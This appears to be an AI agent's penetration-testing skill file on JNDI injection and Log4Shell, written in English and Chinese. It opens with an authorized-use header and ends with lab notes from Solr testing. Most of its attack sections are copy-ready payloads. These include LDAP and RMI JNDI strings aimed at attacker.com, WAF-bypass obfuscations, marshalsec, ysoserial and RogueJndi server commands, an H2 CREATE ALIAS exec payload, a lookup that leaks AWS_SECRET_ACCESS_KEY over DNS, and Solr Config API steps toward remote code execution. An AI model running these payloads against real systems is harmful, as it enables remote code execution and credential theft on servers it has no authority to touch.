---
name: "jndi-injection-test"
description: "jndi-injection"
---

# jndi-injection

> **使用边界**（2026-09-19 补治理头）：**仅限授权环境**（SRC 范围 / 用户自有资产 / 用户明确点名）。
> 写不写只认 `03-vuln-report-format.md`；**定级也认 03**（只到「可达 + 可绕 + 原语在工作」的**不得**写严重）。
>
> 本文件的核心机制就是「**让目标连我们的服务器并加载/执行任意代码**」—— 所以必须分档用（同 `SKILL.md §2` 第 9 条）：
> · **检测 / 指纹**（`lookup` 是否被调用、报文与报错差异）—— 任何环境，随便试。
> · **仅解析 / 无载荷回连**：**DNS 型 OOB**（`Inet4Address`、`dnslog` 域名一类）或**空响应 Listener**
>   （只记录连接，**不下发任何 reference / class、不返回可反序列化对象**）—— **可做**（授权范围内，含生产）；
>   纪律：单发、唯一域名、不轮询、**优先自有 / 平台提供的 OOB**（public `dnslog.cn` 会把目标出口 IP 暴露给第三方）。
> · **让目标加载远程类**（LDAP/RMI 下发 reference / class、返回可反序列化对象）、完整链、第二段载荷 —— **不做**；
>   要这一类证据，去**非生产实例或本地靶场**跑。
> ★ **DNS 命中 ≠ 命令跑起来** ⇒ 不能据此写「严重」。
>
> ★★ **本文件的「必须有目标可达的监听端」只约束「JNDI 家族」**（代码从我们的服务器来）。
> 另有「**本地字节码内嵌家族**」（BCEL 的 `$$BCEL$$` 串 / `TemplatesImpl` 的 `_bytecodes`）——
> **字节码内嵌在 payload 里、不需要监听端**。**别拿本文件的约束去否它**，反之亦然。
> 分家族判据与推论见 `recon-methodology.md §26`。

# JNDI Injection


## 1. CORE MECHANISM

JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).

**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.

```java
// Vulnerable code pattern:
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
```

---

## 2. ATTACK VECTORS

### RMI (Remote Method Invocation)

```
rmi://attacker.com:1099/Exploit
```

Attacker runs an RMI server returning a `Reference` object pointing to a remote class:
```java
// Attacker's RMI server returns:
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
// JVM downloads http://attacker.com/Exploit.class and instantiates it
```

### LDAP

```
ldap://attacker.com:1389/cn=Exploit
```

Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.

LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI).

### DNS (detection only)

```
dns://attacker-dns-server/lookup-name
```

Useful for confirming JNDI injection without RCE — triggers DNS query to attacker's authoritative NS.

---

## 3. JDK VERSION CONSTRAINTS AND BYPASS

| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
|---|---|---|---|
| < 8u121 | YES | YES | Direct class loading |
| 8u121 – 8u190 | NO (`trustURLCodebase=false`) | YES | Use LDAP vector |
| >= 8u191 | NO | NO | Return serialized gadget object via LDAP |
| >= 8u191 (alternative) | NO | NO | `BeanFactory` + EL injection |

### Post-8u191 Bypass: LDAP → Serialized Gadget

Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally — if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.

```bash
# ysoserial JRMPListener approach:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# Then JNDI lookup points to: rmi://attacker:1099/whatever
```

### Post-8u191 Bypass: BeanFactory + EL

When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:

```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

---

## 4. TOOLING

### marshalsec — JNDI Reference Server

```bash
# Start LDAP server serving a remote class:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Start RMI server:
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# The #Exploit refers to Exploit.class hosted at http://attacker.com/Exploit.class
```

### JNDI-Injection-Exploit (all-in-one)

```bash
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
# Automatically starts RMI + LDAP servers with multiple bypass strategies
```

### Rogue JNDI

```bash
java -jar RogueJndi.jar --command "id" --hostname attacker.com
# Provides RMI, LDAP, and HTTP servers with auto-generated payloads
```

---

## 5. LOG4J2 — CVE-2021-44228 (LOG4SHELL)

### Mechanism

Log4j2 supports **Lookups** — expressions like `${...}` that are evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:

```
${jndi:ldap://attacker.com/x}
```

**Any logged string** containing this pattern triggers the vulnerability — User-Agent, form fields, HTTP headers, URL paths, error messages.

### Detection Payloads

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}

# Exfiltrate environment info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants

Log4j2's lookup parser is very flexible:

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### Split-Log Bypass (Advanced)

When WAF detects paired `${jndi:...}` in a single request, split across two log entries:

```text
# Request 1 (logged first):
X-Custom: ${jndi:ldap://attacker.com/
# Request 2 (logged second):
X-Custom: exploit}
```

If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://attacker.com/exploit}` triggers.

### Real-World Case: Solr Log4Shell

```bash
# Confirm via DNSLog — Solr admin cores API:
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS hit with Java version = confirmed Log4Shell in Solr
```

### Injection Points to Test

```text
User-Agent          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie values       URL path segments     POST body fields
Search queries      File upload names     Form field names
GraphQL variables   SOAP/XML elements     JSON values
```

### Affected Versions

- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x is NOT affected (different lookup mechanism)

---

## 6. OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

### H2 Console：JDBC URL / CREATE ALIAS

认：Spring Boot 或管理台出现 `/h2-console`；登录表能填 JDBC URL；`web-allow-others` 开了（外网能打开）。**没看到这个页不要找。**

打：

1. JDBC URL 填 `ldap://协作域/Exploit` 或 `javax.naming.InitialContext`（BeanFactory + EL，JDK ≥ 8u191 常用）。LDAP 侧用上面 §3 的 `javaClassName=javax.el.ELProcessor` + `BeanFactory`。
2. 能进 SQL 页再打：

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');
```

算成：命令跑起来（DNS 打到 JNDI 只算确认 lookup，还要跟到 exec 或 gadget）。只打开了控制台、连不上库 → 没成。

假点：只本机 `localhost` 能开；JDBC URL 写死、改不了；`CREATE ALIAS` 被禁。这枪偏窄，**不进短表**；见了再打开本段。

---

## 7. TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}
│   └── DNS hit? → Confirmed JNDI evaluation
│
├── Determine JDK version:
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191?
│   ├── Start marshalsec LDAP server with remote class
│   └── ${jndi:ldap://attacker:1389/Exploit} → direct RCE
│
├── JDK >= 8u191?
│   ├── LDAP → serialized gadget (need gadget chain on classpath)
│   ├── BeanFactory + EL (need Tomcat on classpath)
│   └── JRMPListener via ysoserial
│
└── WAF blocking ${jndi:...}?
    └── Try obfuscation: ${${lower:j}ndi:...}
```

---

## 8. QUICK REFERENCE

```text
# Safe confirmation (DNS only):
${jndi:dns://TOKEN.collab.net}

# LDAP RCE (JDK < 8u191):
${jndi:ldap://ATTACKER:1389/Exploit}

# Version exfiltration:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# Log4Shell with WAF bypass:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# Start LDAP reference server:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# Post-8u191 — ysoserial JRMP:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```

---

## 9. OOB 判据纪律（2026-10-03 亲例补录）

**两个必做步骤，缺一则结论无效：**

1. ★★ **OOB 通道阳性对照必做** —— 发载荷**之前**，先用**本机**解析一个随机子域
   （`nslookup a0.<你的dnslog域>`），确认平台**确实记录**该查询。
   亲例：`a0.<域>` → dnslog 有记录（证明平台工作），同批目标载荷**无记录**
   ⇒ 此时结论才是「**未触发**」。**没有这个对照，「无回连」与「平台坏了」无法区分。**
2. ★★ **载荷完整性核对** —— `printf '%s' '<载荷>' | wc -c` 原样输出核对，
   排除 **shell / `printf` / 前端转义**把 `${lower:l}` 之类吃掉造成的**假阴性**。
   亲例：日志里 `printf` 把 `\${lower:l}` 显示成了 `/`，但 `curl` 单引号参数实际正确
   ⇒ **显示层与实发层必须分别核对**。

**WAF 前置排除顺序**（否则会把 403 误当「无漏洞」）：

① 先证**目标路径存在**（同组件相邻版本各打一发，亲例 `1.2.0` 与 `1.2.1` 都 200）；
② 直发 PoC 原载荷 → 若 403，做 **WAF 规则边界测绘**（见 `waf-bypass.md §10`）；
③ 用绕过形态重发，确认响应**到达应用**（200 + 业务体）；
④ 再判 OOB 是否回连。

**口径**：全程无回连 ⇒ 只写「**未复现**」，**不写「不存在」**
（可能原因：版本已修复 / 该参数未入日志 / 未使用该组件 —— 未区分前不臆断）。

★ 另：`${jndi:dns://x}` 属**「仅解析、无载荷回连」** ⇒ 按本项目红线属**免单独同意**的 OOB 形态；
Log4j 的 `ldap://` 在**不提供真实 LDAP 服务**时也只是 DNS 解析 + TCP 失败，同样不构成代码执行。

---

## 10. Solr + Log4j2 专项（2026-10-10 双轮实证，靶机 `Solr 8.11.0 / JDK 8u102`）

### 10.1 注入落点矩阵（★ 最省时间的一步，先做）

| 落点 | 结果 | 备注 |
|---|---|---|
| `?action=${jndi:...}` | ✅ 触发 | `/solr/admin/cores`、`/solr/<core>/...` 均有效 |
| `?qt=${jndi:...}` | ✅ 触发 | |
| `User-Agent` | ❌ **不触发** | ★ **UA 是最常见的 Log4j 注入点，但 Solr 不记 UA** ⇒ 别在 UA 上耗轮次 |
| `X-Forwarded-Host` / 路径段 / Cookie / Referer / Accept-Language | ❌ | |

**判据**：Solr 把**请求参数**写进 `SolrException` 消息 → **Log4j 在渲染该 message 时解析 `${}`**。
所以 `?action=<任意非法值>` 能拿到 `Unsupported operation: <你的值>` 就是 sink 可达的**快速判据**。

### 10.2 ★★ 未授权读日志 —— 比抓包更直接的验证工具

```
GET /solr/admin/info/logging?since=0
```
返回 `{watcher, info:{buffer:50, threshold:"WARN", last}, history:{docs:[{time,level,logger,message,core}]}}`

- **`threshold:"WARN"`** ⇒ 缓冲只留 WARN+ ⇒ **200/400 的正常请求不写日志**
  —— 这本身解释了「大量注入尝试在日志里查无痕迹」。
- **能直接读到 Log4j 消费 `${}` 的痕迹**：message 里 `${jndi:...}` 被吃成 `$jndi:...`（只吃 `{`）
  或只剩 `ldap://...`（完整吃 `${jndi:` + `}`）。
- ★ **用法**：投一发 → 立刻 `since=0` 看有没有新 ERROR ⇒ **不用靠"响应回显"间接推**。
- ★ 顺带：缓冲里常有**前人的探测痕迹**（`oast.me` = interactsh、`.../Deserialization/cc6/command/Base64/...`
  = JNDIExploit 特征）⇒ **等于白送一份攻击面清单**。

### 10.3 ★★ 判「Log4j 解析器是否在求值」的精确 oracle

| 输入（放 `?action=`） | 响应 `msg` | 含义 |
|---|---|---|
| `${sys:java.version}` | `Unsupported operation: java.version` | **`${sys:` 与 `}` 被消费、key 保留** ⇒ 语法被识别，**lookup 未求值** |
| `${sys:java.version}` | `Unsupported operation: 1.8.0_102` | **lookup 求值成功**（★ 才是真解析） |
| `${jndi:ldap://x/y}` | `Unsupported operation: $jndi:ldap://x/y` | 只吃了 `{` |
| `${jndi:ldap://x/y}`（放 `?q=`） | 日志里 `... Cannot parse 'ldap://x/y'` | 完整吃 `${jndi:` + `}` |

★★ **铁律**：**"`${}` 被消费" ≠ "lookup 求值" ≠ "RCE"。** 三者是**三个不同层级**，
必须用**带外回连 + 远端下载/执行**才能定到 RCE（见 §9 与本文文首分档）。

### 10.4 ★★★ 「首次触发后整体静默」—— 已两次独立实证，当确定性现象对待

**现象**：目标对该特征**第一次触发成功，之后一切 `${jndi:` 变体 0 回连**，而**普通请求仍 200**。

| 已排除的假设（都做了实验） | 结论 |
|---|---|
| 注入点不触发 | ✗ 参数确实进处理链（400 回显 params、日志有记录） |
| 日志级别不够 | ✗ 已把 root 提到 DEBUG，仍不触发 |
| 目标不出网 | ✗ 首次已成功回连 |
| listener 没存活 | ✗ 单进程模式（listener 与投递同进程）已排除 |
| 载荷被 shell/编码吃掉 | ✗ `printf '%s' \| wc -c` + 响应回显双向核对 |
| 目标在扫本机端口段 | ✗ 无意义端口被动监听 40s 零连接 |
| **同 host:port 连接缓存** | 换端口 8082~8130、换本机 IP、换协议 dns/rmi/iiop —— **全部无效** ⇒ **非连接级缓存** |

**处置（红线相关）**：
1. **不能判「漏洞不存在」** —— 首次带外证据是硬的（源 IP + LDAP BindRequest 无法伪造）。
2. **不能反复重试** —— 同载荷连打 3 次全无 = **确定性封堵**；继续连打**逼近压测红线** ⇒ **停手**。
3. 报告写「**首次触发成功（附原始报文），后续对该特征静默、未复现**」，成因标**疑似**。
4. 可能的成因（未定）：靶场平台的一次性防重放 / WAF 识别 `${jndi:` 动态封堵 / 组件侧缓存。

### 10.5 Solr 未授权面速查（单发可判）

```
GET /solr/admin/authentication      → "No authentication configured" 即零认证（★ 一句话铁证）
GET /solr/admin/info/system         → JVM 版本（判 8u191 分水岭）、完整 bootclasspath
GET /solr/admin/info/properties     → 系统属性 + 内网路径
GET /solr/admin/info/logging?since=0→ 日志缓冲区（见 §10.2）
GET /solr/demo/config               → 完整 solrconfig.xml
```
★ 按 `03`：**单看"未授权读"不落盘**（「仅未授权 up/down 不写」）。要成洞须证明**可写/可执行**
—— 零认证时 **Config API（POST `/solr/<core>/config`）可写** = **CVE-2019-17558 类 RCE 的前置**
（`velocity` 参数注入 / `<lib dir>` 注入）。**那是写操作，先取得同意再测。**

### 10.5b ★★★ Solr 8.11.0 打 CVE-2019-17558：**先探"类能否加载"，再决定要不要落 jar**

**实测（2026-10-10，Solr 8.11.0 官方 vulhub 镜像）**：

```
POST /solr/<core>/config
{"add-queryResponseWriter":{"name":"velocity","class":"solr.VelocityResponseWriter",
                            "content-type":"text/html;charset=UTF-8"}}
→ 400  errorMessages=[Error loading class 'solr.VelocityResponseWriter']
```

**★ 判据**：报 `Error loading class 'xxx'` ⇒ **该 writer 类不在 classpath**
⇒ 必须先让 jar 进 classpath，**否则任何写法都白费**（与 Config API 语法无关）。

**Config API 写法要点**：
- ✅ `add-queryResponseWriter` = **扁平对象**（`name`/`class` 与 writer 名同级）；嵌套一层
  （`{"velocity":{...}}`）会报 `'name' is a required field, 'class' is a required field`。
- ❌ `set-property` **改不了** `queryResponseWriter`（`'queryResponseWriter' is not an editable property`）。
  ⇒ **不是所有键都能用 `set-property`**；先试 `add-` 语义。

**让 jar 进 classpath 的两条路**（都需 reload core 才生效）：
1. `<instanceDir>/lib/` 放 jar（Solr 自动加载；本环境 `demo/lib/` 原本不存在，需自建）
2. 改 `solrconfig.xml` 加 `<lib dir="...">`（★ **改文件 + reload**；velocity 依赖
   `commons-lang3` 要先于 velocity 加载，否则 NoClassDefFound）
- ⚠️ **jar 在这≠重载后一定进 classpath**（Solr classloader 有层级缓存）⇒ **落完必须实测**。

**★ 通用纪律（省冤枉动作）**：
**判"能不能用某插件类"只需一次请求** —— 直接发 `add-<plugin>` 看是否 `Error loading class`。
**先探类加载，再决定要不要落 jar/改配置**，不要一上来就写文件。

**★ `enableRemoteStreaming`**：`configoverlay.json` 里若为 `true`，则 `stream.file`/`stream.url`
**任意文件读**前置已满足（走 `/update` 端点，属性仍偏写）。**未实测，先取同意。**

### 10.6 环境纪律（本轮踩坑）

- ★★ **`nohup ... &` 起的 listener 会随 turn 结束被 SIGTERM** ⇒ 多轮测试**必须用单进程模式**：
  *同一个脚本里* 起 listener → 投递 → `sleep` 收 → 打印。否则「无回连」全是假的（listener 早死了）。
- ★ `curl "url?action=${PAYLOAD}"` **双引号内 `${}` 会被 shell 展开** ⇒ 用单引号，或
  `printf '%s' <载荷> \| wc -c` 核对实发字节；**显示层与实发层必须分别核对**。
- ★ 开测前**在本日 memory 里 grep 目标 IP:端口** —— 同日同名靶机大概率已测过，别重推一遍。

---

## 11. ★★★【重大修正】「首次触发后整体静默」的真因 = **Log4j2 异步日志线程被 JNDI lookup 阻塞**

> **本条推翻 §10.4 的「WAF/平台防护」推测。** 2026-10-10 二轮 + SSH 内部排查实证（Solr 8.11.0 / Log4j2 2.14.1 / JDK 8u102）。

### 11.1 现象与本因

**现象**：首发 `${jndi:}` 成功带外 ⇒ 之后**同载荷换端口/换IP/换协议/开DEBUG 全部 0 回连、0 日志**
⇒ 误判为「对 `${jndi:` 特征静默」（WAF / 靶场防重放）。

**真因**（thread dump 铁证）：`JndiLookup.lookup()` 是在 **Log4j2 独有的异步日志后台线程**
（`Log4j2-TF-N-AsyncLoggerConfig-1`，`com.lmax.disruptor.BatchEventProcessor.run`）上**同步执行**的。
一旦 `InitialContext.lookup()` 在 **`Socket.connect()`** 上阻塞（目标 LDAP 端口不接受/不回包/SYN 黑洞），
**这个线程就被无限期占住** ⇒ **Disruptor 队列停止消费** ⇒

```
★ 全局日志彻底停写：solr.log 不追加、/admin/info/logging 缓冲 last 冻结
★ 之后一切注入「看起来」都没触发（其实可能触发了，只是没证据落下来）
★ 服务本身仍 200（只死日志线程，Jetty 线程池正常）
```

**恢复**：等 socket 超时释放（默认 SYN 重试 ~30 分钟量级）**或**用可控的 connect 行为打断 ——
实测卡了 **33 分钟**（14:15:03 → 14:15:44 之间释放）后，**积压日志一次性刷出 36KB**。

### 11.2 ★★ thread dump 铁证（判据原文）

```java
"Log4j2-TF-3-AsyncLoggerConfig-1" #14 daemon prio=5
   java.lang.Thread.State: RUNNABLE
    at java.net.PlainSocketImpl.socketConnect(Native Method)   ← ★ 卡在 connect
    at com.sun.jndi.ldap.Connection.createSocket(Connection.java:363)
    at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
    at javax.naming.InitialContext.lookup(InitialContext.java:417)
    at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
    ...
    at com.lmax.disruptor.BatchEventProcessor.run(BatchEventProcessor.java:125)
```

### 11.3 ★★ 通用判据（写给下一次）

1. **★ 判「突发后静默」前，先怀疑「日志后端被阻塞」** —— 不要直接跳到「WAF / 平台防护」。
   **验证动作**：`stat` 日志文件大小**两次采样**看是否增长；发一发**已知会记日志**的请求
   （Solr: `?action=STATUS` 成功=0，`action=<垃圾>`=EXCEPTION）看日志涨不涨。
2. **★★ thread dump 是最强手段**（`kill -3 <pid>`；JDK 精简版无 jstack/jcmd 时用它，
   dump 进 **stdout** → `docker logs`）→ 直接看**哪个线程卡在哪个 native 调用**。
   本例一眼看到 `Log4j2-TF-*` 线程停在 `socketConnect`。
3. **★「日志没记录」≠「没触发」**：本例 log 停写期间的真实注入全部丢失证据。
   **日志静止本身就是信号**，要读出它、而不是当噪声忽略。
4. **★ 用「会立即拒绝」的地址做 OOB 探测更安全**：block 黑洞地址（不可达 IP:端口）会把日志线程
   卡 ~30 分钟；**优先 127.0.0.1:<关闭端口>（秒回 RST）** 或直接回包的受控 listener。
   ⇒ 这同时是**给靶场做 DDos-adjacent** 的反面教材：**别把目标的日志线程打死**。
5. **★ 同一 JVM 里 lookup 的副作用面**：Log4j2 async 下，**一个** 卡住的 lookup 能导致
   **全应用日志失效**（不只是这一条）。⇒ 排查"日志丢失"类问题时先查这类"旁路阻塞"。
6. **判 SSRF/外连是否真的发生**看线程栈里的 socket 目标，比看回连日志更可靠（本例栈里就是
   `socketConnect` 在连我投递的地址 ⇒ **JNDI 求值 100% 发生**）。

### 11.4 配套：`action=` 值被 lookup 求值后的**日志形态**（用于判「求值 vs 未求值」）

| 日志里看到 | 含义 |
|---|---|
| `params={action=com.sun.jndi.ldap.LdapCtx@1a2b3c}` | ★★ **lookup 求值成功**，`action` 值被替换成 **JNDI 上下文对象** |
| `params={action=${jndi:ldap://...}}` （**原样保留 `{`**） | ⚠️ **未求值**（多半是 **shell 把 `${` 吃掉了**，实发已非合法语法） |
| `params={action=$jndi:ldap://...}` （`{` 丢失） | ⚠️ **未求值**：**实发时 `{` 已不在** ⇒ 是**投递侧**问题，不是目标侧 |
| `Unsupported operation: java.version`（`${sys:` 被吃、key 保留） | 语法被识别但 **lookup 未求值** |

★★ **判「求值」的唯一硬形态 = `LdapCtx@<hash>`（或其它求值产物）**；
**日志里出现 `${jndi:` 原文 = 一定没求值**（真求值后原文不复存在）。
